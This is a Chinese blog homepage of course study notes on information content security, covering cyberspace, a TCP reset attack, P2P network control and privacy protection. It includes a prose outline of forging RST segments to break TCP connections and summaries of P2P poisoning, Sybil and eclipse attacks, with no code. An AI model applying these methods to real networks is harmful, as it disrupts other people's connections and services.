<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
  <script src="/lib/pace/pace.min.js"></script>

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="hkbin hkbin hkbin">
<meta property="og:type" content="website">
<meta property="og:title" content="hkbin的小博客~">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="hkbin的小博客~">
<meta property="og:description" content="hkbin hkbin hkbin">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="hkbin">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>hkbin的小博客~</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">hkbin的小博客~</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="heartbeat fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/11/29/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E6%A6%82%E8%AE%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.png">
      <meta itemprop="name" content="hkbin">
      <meta itemprop="description" content="hkbin hkbin hkbin">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hkbin的小博客~">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/11/29/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E6%A6%82%E8%AE%BA/" class="post-title-link" itemprop="url">信息内容安全概论</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-11-29 21:31:42 / 修改时间：21:32:41" itemprop="dateCreated datePublished" datetime="2023-11-29T21:31:42+08:00">2023-11-29</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>230</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1>概述</h1>
<h1>什么是网络空间？网络空间的四个基本要素包括哪些？</h1>
<p><img src="./images/%E6%A6%82%E8%BF%B0%203b3ef29a87f048b4b30e8904fb2866ba/Untitled.png" alt="Untitled"></p>
<p><img src="./images/%E6%A6%82%E8%BF%B0%203b3ef29a87f048b4b30e8904fb2866ba/Untitled%201.png" alt="Untitled"></p>
<h1>什么是网络空间安全？网络空间安全学科的研究方向有哪些？</h1>
<p><img src="./images/%E6%A6%82%E8%BF%B0%203b3ef29a87f048b4b30e8904fb2866ba/Untitled%202.png" alt="Untitled"></p>
<p><img src="./images/%E6%A6%82%E8%BF%B0%203b3ef29a87f048b4b30e8904fb2866ba/Untitled%203.png" alt="Untitled"></p>
<p><img src="./images/%E6%A6%82%E8%BF%B0%203b3ef29a87f048b4b30e8904fb2866ba/Untitled%204.png" alt="Untitled"></p>
<p><img src="./images/%E6%A6%82%E8%BF%B0%203b3ef29a87f048b4b30e8904fb2866ba/Untitled%205.png" alt="Untitled"></p>
<h1>《网络安全法》中的主体、客体主要有哪些？试列举各主体的基本责任和义务。</h1>
<p><img src="./images/%E6%A6%82%E8%BF%B0%203b3ef29a87f048b4b30e8904fb2866ba/Untitled%206.png" alt="Untitled"></p>
<p><img src="./images/%E6%A6%82%E8%BF%B0%203b3ef29a87f048b4b30e8904fb2866ba/Untitled%207.png" alt="Untitled"></p>
<p><img src="./images/%E6%A6%82%E8%BF%B0%203b3ef29a87f048b4b30e8904fb2866ba/Untitled%208.png" alt="Untitled"></p>
<p><img src="./images/%E6%A6%82%E8%BF%B0%203b3ef29a87f048b4b30e8904fb2866ba/Untitled%209.png" alt="Untitled"></p>
<h1>什么是网络空间主权？基本原则是什么？(独立平等自主管辖)</h1>
<p><img src="./images/%E6%A6%82%E8%BF%B0%203b3ef29a87f048b4b30e8904fb2866ba/Untitled%2010.png" alt="Untitled"></p>
<p><img src="./images/%E6%A6%82%E8%BF%B0%203b3ef29a87f048b4b30e8904fb2866ba/Untitled%2011.png" alt="Untitled"></p>
<p><img src="./images/%E6%A6%82%E8%BF%B0%203b3ef29a87f048b4b30e8904fb2866ba/Untitled%2012.png" alt="Untitled"></p>
<h1>什么是信息内容安全？</h1>
<p>主要涉及对传播信息的有效审查监管，剔除非授权信息(非法信息、泄密信息、垃圾邮件等)，保护授权信息。</p>
<p><img src="./images/%E6%A6%82%E8%BF%B0%203b3ef29a87f048b4b30e8904fb2866ba/Untitled%2013.png" alt="Untitled"></p>
<h1>信息内容安全技术主要包括哪些？(获取、识别、分析、管控)</h1>
<p><img src="./images/%E6%A6%82%E8%BF%B0%203b3ef29a87f048b4b30e8904fb2866ba/Untitled%2014.png" alt="Untitled"></p>
<p><img src="./images/%E6%A6%82%E8%BF%B0%203b3ef29a87f048b4b30e8904fb2866ba/Untitled%2015.png" alt="Untitled"></p>
<h1>信息内容安全技术面临的挑战是什么？(数据量大，计算复杂度高，网络技术新，社会矛盾深)</h1>
<p><img src="./images/%E6%A6%82%E8%BF%B0%203b3ef29a87f048b4b30e8904fb2866ba/Untitled%2016.png" alt="Untitled"></p>
<p><img src="./images/%E6%A6%82%E8%BF%B0%203b3ef29a87f048b4b30e8904fb2866ba/Untitled%2017.png" alt="Untitled"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/11/29/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.png">
      <meta itemprop="name" content="hkbin">
      <meta itemprop="description" content="hkbin hkbin hkbin">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hkbin的小博客~">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/11/29/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86/" class="post-title-link" itemprop="url">信息内容安全管理</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-11-29 21:27:05 / 修改时间：21:28:09" itemprop="dateCreated datePublished" datetime="2023-11-29T21:27:05+08:00">2023-11-29</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>1.6k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>6 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1>信息内容安全管理</h1>
<p>Created: November 29, 2023 4:36 PM<br>
Reviewed: No</p>
<h1>信息内容安全管理的目标是什么</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>剔除非授权信息(非法信息、泄密信息、垃圾邮件等)</p>
</li>
<li class="lvl-2">
<p>保护授权信息(知识产权)</p>
</li>
</ul>
<h1>TCP重置攻击</h1>
<p><img src="./images/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%20094c69e097514e8f98123a500a03459b/Untitled.png" alt="Untitled"></p>
<p>伪造的难点：Seg number必须满足：</p>
<p><img src="./images/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%20094c69e097514e8f98123a500a03459b/Untitled%201.png" alt="Untitled"></p>
<p><img src="./images/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%20094c69e097514e8f98123a500a03459b/Untitled%202.png" alt="Untitled"></p>
<p>所以总结一下要干什么：</p>
<ol>
<li class="lvl-3">
<p>嗅探通信双方的交换信息。</p>
</li>
<li class="lvl-3">
<p>截获一个ACK标志位置为1的报文段，并读取其ACK号。</p>
</li>
<li class="lvl-3">
<p>伪造一个TCP重置报文段(RST 标志位置为1)，其序号等于上面截获的ACK号</p>
</li>
<li class="lvl-3">
<p>这只是理想情况下的方法，假设信息交换的速度不是很快。大多数情况下为了增加成功率，可以连续发送序列号不同的重置报文，将伪造好的重置报文发送给任意一方，使TCP链接中断。</p>
</li>
</ol>
<h1>P2P网络的管理方法</h1>
<h2 id="基于用户来源交换的控管技术">基于用户来源交换的控管技术</h2>
<p>BT协议的脆弱性</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>身份验证缺陷</p>
</li>
<li class="lvl-2">
<p>协议不规范</p>
</li>
</ul>
<p>伪造用户来进行P2Plink，消耗网络资源</p>
<h2 id="基于分布式哈希表的隔离管控技术">基于分布式哈希表的隔离管控技术</h2>
<h3 id="索引毒害">索引毒害</h3>
<p>找到所有指向索引节点集的前一跳节点</p>
<p>发布伪造的Sybil节点</p>
<h3 id="路由污染">路由污染</h3>
<p>生成靠近目标InfoHash的节点ID</p>
<p>主动污染和被动污染</p>
<h2 id="索引污染">索引污染</h2>
<p><img src="./images/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%20094c69e097514e8f98123a500a03459b/Untitled%203.png" alt="Untitled"></p>
<p><img src="./images/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%20094c69e097514e8f98123a500a03459b/Untitled%204.png" alt="Untitled"></p>
<p><a target="_blank" rel="noopener" href="https://www.notion.so">https://www.notion.so</a></p>
<p><img src="./images/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%20094c69e097514e8f98123a500a03459b/Untitled%205.png" alt="Untitled"></p>
<h2 id="资源占用攻击">资源占用攻击</h2>
<p><img src="./images/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%20094c69e097514e8f98123a500a03459b/Untitled%206.png" alt="Untitled"></p>
<p><img src="./images/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%20094c69e097514e8f98123a500a03459b/Untitled%207.png" alt="Untitled"></p>
<h2 id="数据欺骗">数据欺骗</h2>
<p><img src="./images/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%20094c69e097514e8f98123a500a03459b/Untitled%208.png" alt="Untitled"></p>
<p><img src="./images/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%20094c69e097514e8f98123a500a03459b/Untitled%209.png" alt="Untitled"></p>
<p><img src="./images/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%20094c69e097514e8f98123a500a03459b/Untitled%2010.png" alt="Untitled"></p>
<p><img src="./images/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%20094c69e097514e8f98123a500a03459b/Untitled%2011.png" alt="Untitled"></p>
<p>P2P机制：</p>
<p>分片机制。<br>
BitTorrent像其他文件共享软件一样对文件进行了分片(Piece),Piece是最小的文件共享单位,每个Leecher在下载完一个完整的分片后才会进行完整性校验, 完整性校验成功后通知其他节点自己拥有这部分数据。为了加快文件传输的并行性,每个分片还会分成更小的分块(Block), Block是最小的文件传输单位,数据请求者每次向数据提供者请求一个Block的数据。</p>
<p>片选择机制。为了保证共享网络的健壮性,延长一个共享网络的生命周期, BitTorrent通过局部最少块优先(Rarest-First)策略在节点间交换数据。下载节点根据自己周围的邻居节点拥有的数据块信息,选择拥有节点最少的分块优先下载,从而维护局部的数据块相对平衡。</p>
<p>所以会导致别的节点不去下载分块1，从而请求的时候，如果有一个唯一具有分块1退出了网络，则该网络中再也没有分块1。</p>
<h2 id="数据块污染">数据块污染</h2>
<p><img src="./images/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%20094c69e097514e8f98123a500a03459b/Untitled%2012.png" alt="Untitled"></p>
<p><img src="./images/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%20094c69e097514e8f98123a500a03459b/Untitled%2013.png" alt="Untitled"></p>
<p><img src="./images/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%20094c69e097514e8f98123a500a03459b/Untitled%2014.png" alt="Untitled"></p>
<h2 id="Eclipse方法">Eclipse方法</h2>
<p><img src="./images/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%20094c69e097514e8f98123a500a03459b/Untitled%2015.png" alt="Untitled"></p>
<p><img src="./images/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%20094c69e097514e8f98123a500a03459b/Untitled%2016.png" alt="Untitled"></p>
<p><img src="./images/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%20094c69e097514e8f98123a500a03459b/Untitled%2017.png" alt="Untitled"></p>
<p><img src="./images/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%20094c69e097514e8f98123a500a03459b/Untitled%2018.png" alt="Untitled"></p>
<p><img src="./images/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%20094c69e097514e8f98123a500a03459b/Untitled%2019.png" alt="Untitled"></p>
<h1>隐私保护技术</h1>
<h2 id="隐私数据的分类">隐私数据的分类</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>显示标识符：能够唯一识别一个用户身份的属性，比如姓名、身份证号码等</p>
</li>
<li class="lvl-2">
<p>准标识符：不能唯一识别一个用户身份的属性，需多个属性组合才能唯一识别一个用户身份，如地址、性别、生日等</p>
</li>
<li class="lvl-2">
<p>敏感信息：涉及隐私信息的属性，如薪资、健康状况和财务信息等</p>
</li>
</ul>
<h2 id="隐私度量的概念">隐私度量的概念</h2>
<p>用来评估个人的隐私水平及隐私保护技术能达到的效果，同时也为了测量”隐私”这个概念。</p>
<h3 id="基于匿名的隐私度量方法：k-anonymity-k-匿名-，I-diversity-I-多样性-，t-closeness-t-近似性">基于匿名的隐私度量方法：k-anonymity(k-匿名)，I-diversity(I-多样性)，t-closeness(t-近似性)</h3>
<p><img src="./images/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%20094c69e097514e8f98123a500a03459b/Untitled%2020.png" alt="Untitled"></p>
<p><img src="./images/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%20094c69e097514e8f98123a500a03459b/Untitled%2021.png" alt="Untitled"></p>
<p><img src="./images/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%20094c69e097514e8f98123a500a03459b/Untitled%2022.png" alt="Untitled"></p>
<p><img src="./images/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%20094c69e097514e8f98123a500a03459b/Untitled%2023.png" alt="Untitled"></p>
<p><img src="./images/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%20094c69e097514e8f98123a500a03459b/Untitled%2024.png" alt="Untitled"></p>
<p><img src="./images/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%20094c69e097514e8f98123a500a03459b/Untitled%2025.png" alt="Untitled"></p>
<p><img src="./images/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%20094c69e097514e8f98123a500a03459b/Untitled%2026.png" alt="Untitled"></p>
<p><img src="./images/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%20094c69e097514e8f98123a500a03459b/Untitled%2027.png" alt="Untitled"></p>
<p><img src="./images/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%20094c69e097514e8f98123a500a03459b/Untitled%2028.png" alt="Untitled"></p>
<p><img src="./images/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%20094c69e097514e8f98123a500a03459b/Untitled%2029.png" alt="Untitled"></p>
<p><img src="./images/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%20094c69e097514e8f98123a500a03459b/Untitled%2030.png" alt="Untitled"></p>
<p><img src="./images/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%20094c69e097514e8f98123a500a03459b/Untitled%2031.png" alt="Untitled"></p>
<p><img src="./images/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%20094c69e097514e8f98123a500a03459b/Untitled%2032.png" alt="Untitled"></p>
<p><img src="./images/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%20094c69e097514e8f98123a500a03459b/Untitled%2033.png" alt="Untitled"></p>
<h3 id="3）基于差分隐私的度量方法，能解决的问题，了解即可。"><strong>3）基于差分隐私的度量方法，能解决的问题，了解即可。</strong></h3>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>差分隐私</strong>：用一种方法使得查询n个记录和查询n-1个记录得到的结果是相对一致的，那么攻击者无法通过比较（差分）查询结果的不同找出第n 个记录的信息。</p>
<ul class="lvl-2">
<li class="lvl-6">对于差别只有一条记录的两个数据集 D 和 D’ (neighboring datasets)，查询他们获得结果相同的概率非常接近。</li>
<li class="lvl-6">攻击者无法通过观察计算结果而获取准确的个体信息.</li>
</ul>
<p><img src="./images/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%20094c69e097514e8f98123a500a03459b/Untitled%2034.png" alt="Untitled"></p>
</li>
</ul>
<h3 id="4）常用的隐私保护技术的分类，熟练掌握四种类别，各种隐私保护方法的分类归属。"><strong>4）常用的隐私保护技术的分类，熟练掌握四种类别，各种隐私保护方法的分类归属。</strong></h3>
<ul class="lvl-0">
<li class="lvl-2">
<p>变换：</p>
</li>
</ul>
<p><img src="./images/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%20094c69e097514e8f98123a500a03459b/Untitled%2035.png" alt="Untitled"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>分治：</p>
</li>
</ul>
<p><img src="./images/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%20094c69e097514e8f98123a500a03459b/Untitled%2036.png" alt="Untitled"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>隐匿：</p>
</li>
</ul>
<p><img src="./images/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%20094c69e097514e8f98123a500a03459b/Untitled%2037.png" alt="Untitled"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>混淆：</p>
</li>
</ul>
<p><img src="./images/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%20094c69e097514e8f98123a500a03459b/Untitled%2038.png" alt="Untitled"></p>
<h3 id="5）同态加密技术的原理，了解即可"><strong>5）同态加密技术的原理，了解即可</strong></h3>
<p><img src="./images/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%20094c69e097514e8f98123a500a03459b/Untitled%2039.png" alt="Untitled"></p>
<h3 id="6）联邦学习的原理，横向、纵向、迁移学习"><strong>6）联邦学习的原理，横向、纵向、迁移学习</strong></h3>
<p>比如业务相同但是分布在不同地区的两家企业，它们的用户群体分别来自各自所在的地区，相互的交集很小。但是，它们的业务很相似，因此，记录的用户特征是相同的。此时，就可以使用横向联邦学习来构建联合模型。</p>
<p>比如有两个不同机构，一家是某地的银行，另一家是同一个地方的电商。它们的用户群体很有可能包含该地的大部分居民，因此用户的交集较大。但是，由于银行记录的都是用户的收支行为与信用评级，而电商则保有用户的浏览与购买历史，因此它们的用户特征交集较小。纵向联邦学习就是将这些不同特征在加密的状态下加以聚合，以增强模型能力的联邦学习。目前机器学习模型如逻辑回归、决策树等均是建立在纵向联邦学习系统框架之下的。</p>
<p>比如有两个不同机构，一家是位于中国的银行，另一家是位于美国的电商。由于受到地域限制，这两家机构的用户群体交集很小。同时，由于机构类型的不同，二者的数据特征也只有小部分重合。在这种情况下，要想进行有效的联邦学习，就必须引入迁移学习，来解决单边数据规模小和标签样本少的问题，从而提升模型的效果。</p>
<p><img src="./images/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%20094c69e097514e8f98123a500a03459b/Untitled%2040.png" alt="Untitled"></p>
<p><img src="./images/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%20094c69e097514e8f98123a500a03459b/Untitled%2041.png" alt="Untitled"></p>
<p><img src="./images/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%20094c69e097514e8f98123a500a03459b/Untitled%2042.png" alt="Untitled"></p>
<p><img src="./images/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%20094c69e097514e8f98123a500a03459b/Untitled%2043.png" alt="Untitled"></p>
<p><img src="./images/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%20094c69e097514e8f98123a500a03459b/Untitled%2044.png" alt="Untitled"></p>
<h3 id="7）基于位置的隐私保护，攻击模型和保护方法了解即可"><strong>7）基于位置的隐私保护，攻击模型和保护方法了解即可</strong></h3>
<p><img src="./images/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%20094c69e097514e8f98123a500a03459b/Untitled%2045.png" alt="Untitled"></p>
<p><img src="./images/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%20094c69e097514e8f98123a500a03459b/Untitled%2046.png" alt="Untitled"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/11/29/%E6%96%87%E6%9C%AC%E5%88%86%E7%B1%BB/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.png">
      <meta itemprop="name" content="hkbin">
      <meta itemprop="description" content="hkbin hkbin hkbin">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hkbin的小博客~">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/11/29/%E6%96%87%E6%9C%AC%E5%88%86%E7%B1%BB/" class="post-title-link" itemprop="url">文本分类</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

